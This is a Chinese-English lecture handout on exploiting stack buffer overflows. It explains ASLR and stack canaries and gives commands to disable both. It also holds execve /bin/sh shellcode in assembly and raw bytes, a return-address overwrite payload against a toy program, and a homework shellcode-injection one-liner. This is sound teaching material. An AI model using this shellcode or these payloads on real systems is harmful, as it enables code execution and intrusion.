# Lecture 2: Stack Overflows

在理解了 [Lecture 1 handouts](/Lecture1/README.md) 里的概念后再来读这一章节。

在这章中，我将介绍下面这些内容：
* Stack overflow.       （栈溢出）
* Their protection mechanisms.      （保护机制）
    * ASLR.  
    * Stack canaries.
* What is shell code.   （ShellCode是什么）
* 如何 Exploit 栈溢出 及 改变程序的执行流


Let's begin.

### 栈溢出 

​	高级语言，例如C在编译成机器指令的过程中并没有提供任何机制来识别在堆栈上声明的缓冲区(char数组)是否可以接收比预期更多的输入。
​	不进行额外的检查有利有弊：为了达到与机器语言相当的速度。

​	如果你还记得 Lecture 1 中的 图, 这就是当执行函数调用时的stack的样子：
```
                       +   Previous function  +
                       |     Stack frame      +
                       |                      |
                       +----------------------+ <--+ previous function stack frame end here
                       |Space for return value|
                       +----------------------+
                       |Arguments for function|
                       +----------------------+
                       |    return address    |
                       +----------------------+
                       |     saved $ebp       |
                       +----------------------+
                       |                      | <--+  padding done by compilers
                       +------------+---------+
                       |         |4 |         |
                       |         |3 |         |
                       |         |2 | ^       |
                       |         |1 | |       |
                       |      ch |0 | |       |
                       +------------+-+-------+
                       |                      |
                       |     unused space     |
                       +                      +
```

​	观察 buffer 在堆栈中的对齐方式。 Buffer (char array) 按从 低地址（栈底） 到 高地址（栈顶） 的顺序存储进栈。
​	并且，C程序并不会检查这个buffer的大小（长度）是否比接收到的用户输入的要小。

因此我们需要记住这几点：

* C 不会检查缓冲区溢出
* buffer中数据存储顺序用户输入的逆序存储的（因为栈的结构，push的时候是逆序，pop的时候就是顺序出来的了）
* 盖过buffer后，继续溢出到一定的程度就有可能覆盖改掉其他保存在stack上面的内容
* 留意`$ebp`和return address在栈中的位置
* 如果我们可以改变return address，我们就可以控制程序执行的工作流了 :cool: 

### Stack Protection 栈保护
#### 1. ASLR
> 地址空间布局随机化 Address space layout randomization (ASLR) 是一种计算机安全技术
> 用来挫败针对内存腐败的漏洞利用的攻击
> 目的是阻止此攻击者可以可靠地跳转到shellcode的内存地址
> 具体来说就是 ASLR 随机排布了进程的关键数据在内存中的地址空间，包括可执行文件运行起来在内存中的基地址和stack的位置，堆和相关的库
Ref: [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)

简单来说 ASLR 技术会让程序每一次执行，其在内存中堆栈的地址都会不断地改变。因此ASLR会阻碍我们exploit.
那我们有办法对付它吗？我们可以禁用它 哈哈 :）:smile:

在后面的章节中我们会进一步讨论这个问题，所以现在你先不管那么多，直接禁用掉它就好了：
`echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space`

#### 2. Stack Canaries
> Stack canaries, 金丝雀这个叫法是参考以前人进入煤矿之前先放只canary进去试试反应而来的, 
> 在这里是指一种试图在执行恶意代码之前检测出栈溢出是否发生的技术。
> 它的原理是这样的：在程序开始执行的时候生成一个随机的小整数，这个值存放在stack中的return pointer之前，
> 当程式执行到即将返回之前会先校验这个值是否有变化，因为如果我们实施了一次buffer overflow攻击，我们就会覆盖掉这个值，所以这种技术就是依靠这个来检查buffer overflow的
Ref:(link)[https://en.wikipedia.org/wiki/Stack\_buffer\_overflow#Stack\_canaries]

这意味着它们只是保护你的buffer.这种技术由编译器来实现，在程序的buffer结束以后加入一些随机数据，使系统能够识别缓冲区溢出。

现在我们在编译程序的时候需要先禁用掉这个技术：
`gcc -fno-stackprotector <file>.c`

### Shell Codes
Shellcode 是一小段用binary写的payload，用来注入到有漏洞的程序里面，你可以制作各种各样的payload
它们只是模块级的二进制代码。制作shellcode是一个很大的话题，在这里我将粗略介绍一下，我们将制作一个可以spwan回来一个shell给我们的shellcode

这里只是粗略地介绍一些关于如何Crafting shellcode的内容
推荐阅读下面的链接了解更多：
[In detail](http://www.vividmachines.com/shellcode/shellcode.html)

```assembly
xor     eax, eax    ;Clearing eax register                  把eax全部置零（清空eax寄存器）
push    eax         ;Pushing NULL bytes                     把eax的内容（NULL byte）push进栈（在C中字符0是string结束的标，对应机器码是\x00）
push    0x68732f2f  ;Pushing //sh                           把字符  //sh  push进栈（注意小端优先）
push    0x6e69622f  ;Pushing /bin                           把字符  /bin  push进栈
mov     ebx, esp    ;ebx now has address of /bin//sh        把当前 esp 的值（指向字符串/bin//sh的地址）copy到 ebx 中
push    eax         ;Pushing NULL byte                      把eax的内容（NULL byte）push进栈
mov     edx, esp    ;edx now has address of NULL byte       把当前 esp 的值（指向NULL byte的地址）copy到 edx 中
push    ebx         ;Pushing address of /bin//sh            把 ebx 的值（指向字符串/bin//sh的地址）push 进栈
mov     ecx, esp    ;ecx now has address of address         把当前 esp 的值（指向存放了字符串/bin//sh地址的栈帧的地址）copy到 ecx 中
                    ;of /bin//sh byte              
mov     al, 11      ;syscall number of execve is 11         把execve的syscall代号: 11 存入al（通用寄存器AX的低8位当作一个8bit的寄存器用）
int     0x80        ;Make the system call                   80中断，执行system call
```


下面是完整的shellcode汇编代码     Here is the fully shellcode in assembly
```assembly
section .text
global _start
_start:
xor     eax, eax
push    eax 
push    0x68732f2f
push    0x6e69622f
mov     ebx, esp 
push    eax 
mov     edx, esp 
push    ebx 
mov     ecx, esp 
mov     al,11
int     0x80
```

Use `nasm` to compile it.
我们可以使用nasm去编译这段汇编代码：
`nasm -f elf shellcode.asm`

编译得到 shellcode.o 这个目标文件，然后链接：       Linking the object file which you compiled in the previous step
`ld -o shellcode shellcode.o`

如果正确的话你会得到一个ELF文件：         If every thing right you will get a ELF file like this:
```
file shellcode
shellcode: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```
你可以测试一下它能否正常工作


现在你可能需要一个shell code bytes，What这是什么玩意？其实说的就是那些与汇编指令一一对应的机器码。
Now you would want to obtain the shell code bytes. What are they? They are
machine code that corresponds to those instructions.
如何得到机器码？可以试试objdump这款工具。
How can we get those? `objdump` will help.
`objdump -d shellcode.o`
You will get something like.
你将得到像下面这种东西：
```
shellcode.o:     file format elf32-i386
Disassembly of section .text:

00000000 <.text>:
   0:    31 c0                    xor    %eax,%eax
   2:    50                       push   %eax
   3:    68 2f 2f 73 68           push   $0x68732f2f
   8:    68 2f 62 69 6e           push   $0x6e69622f
   d:    89 e3                    mov    %esp,%ebx
   f:    50                       push   %eax
  10:    89 e2                    mov    %esp,%edx
  12:    53                       push   %ebx
  13:    89 e1                    mov    %esp,%ecx
  15:    b0 0b                    mov    $0xb,%al
  17:    cd 80                    int    $0x80
```

你可以使用下面的方法从中extract出shell code（得到十六进制格式的以C风格格式化的shellcode：）：
You can use the following shell code to get that extracted. :cool:
``for i in `objdump -d shellcode.o | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do printf \\%c%b x $i ; done``




尝试做一个真实的利用:
---



#### 1. 给定如下示例代码.
```c
#include <stdio.h>

void bar(){
    printf("How come you entered into bar ?\n");
}

void foo(){
    char buffer[10];
    scanf("%s", buffer);
    printf("Hello ji %s \n", buffer);
}

int main(){
    foo();
    return 0;
}
```
​	在这个实验中，我们的任务是：控制程序的执行流，使得函数`bar`被调用并执行。（bar函数的实现也在这个程序文件中）

​	我们需要做的是确定指针ebp的位置距离buffer起始的位置偏移了多少（offset）

`objdump -d ./first`

```
0804848b <bar>:
 804848b:    55                       push   %ebp
 804848c:    89 e5                    mov    %esp,%ebp
 ...

080484a4 <foo>:
 80484a4:    55                       push   %ebp
 80484a5:    89 e5                    mov    %esp,%ebp
 80484a7:    83 ec 18                 sub    $0x18,%esp
 80484aa:    83 ec 08                 sub    $0x8,%esp
 80484ad:    8d 45 ee                 lea    -0x12(%ebp),%eax
 80484b0:    50                       push   %eax
 80484b1:    68 a0 85 04 08           push   $0x80485a0
 80484b6:    e8 b5 fe ff ff           call   8048370 <__isoc99_scanf@plt>
 80484bb:    83 c4 10                 add    $0x10,%esp
 80484be:    83 ec 08                 sub    $0x8,%esp
 80484c1:    8d 45 ee                 lea    -0x12(%ebp),%eax
 80484c4:    50                       push   %eax
 80484c5:    68 a3 85 04 08           push   $0x80485a3
 80484ca:    e8 71 fe ff ff           call   8048340 <printf@plt>
 80484cf:    83 c4 10                 add    $0x10,%esp
 80484d2:    90                       nop
 80484d3:    c9                       leave
 80484d4:    c3                       ret

080484d5 <main>:
...
 80484df:    55                       push   %ebp
 80484e0:    89 e5                    mov    %esp,%ebp
 80484e2:    51                       push   %ecx
 80484e3:    83 ec 04                 sub    $0x4,%esp
 80484e6:    e8 b9 ff ff ff           call   80484a4 <foo>
...

```
​	留意foo里面的这段指令：
```
 80484ad:    8d 45 ee                 lea    -0x12(%ebp),%eax
 80484b0:    50                       push   %eax
 80484b1:    68 a0 85 04 08           push   $0x80485a0
 80484b6:    e8 b5 fe ff ff           call   8048370 <__isoc99_scanf@plt>
```

​	这段指令的操作是：把ebp减去0x12 这个地址push进栈中，然后调用`scanf`，这操作就是要接受输入（ebp-0x12是作为scanf的其中一个参数，具体 man scanf）
我们都知道内存里面的栈帧中有一段是buffer，用来接收输入的，而我们的payload就是要注入到buffer里的，
进制转换 base16(12) == base10(18) 在这个例子中我们可以知道buffer接收输入的起始点距离ebp的地址有18个bytes

​	最后，我们来制作我们的payload（如果你看了不理解为什么payload像下面这样拼接的话，建议你区review上面那个函数调用时栈的结构图）

```echo -e `python -c 'print "A"*18+<Dummay valur for EBP>+<Return address>'` | ./first ```

​	用看起来像下面这样的代码生成payload并传入程序中执行:

```shell
echo -e `python -c 'import struct;print "A"*18+"BBBB"+struct.pack("<I", 0x0804848b )'` | ./first 
Hello ji AAAAAAAAAAAAAAAAAABBBB?
How come you entered into bar ?
Segmentation fault (core dumped)
```

:smile: 我们成功利用了bof漏洞




####  :smile:  作业：尝试解决 exploit\_me\_2.c `Shellcode injection`
* 禁用ASLR
* 使用GDB定位到buffer的起始地址
* 构造栈溢出，把返回地址设为buffer的起始地址
* 在buffer中包含你的shellcode
看起来就像下面这样：
```bash
./second `python -c 'import struct;shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; bufferlen=108; print shellcode+"\x90"*(bufferlen-len(shellcode))+"BBBB"+struct.pack("<I", starting address of the buffer)'`
```

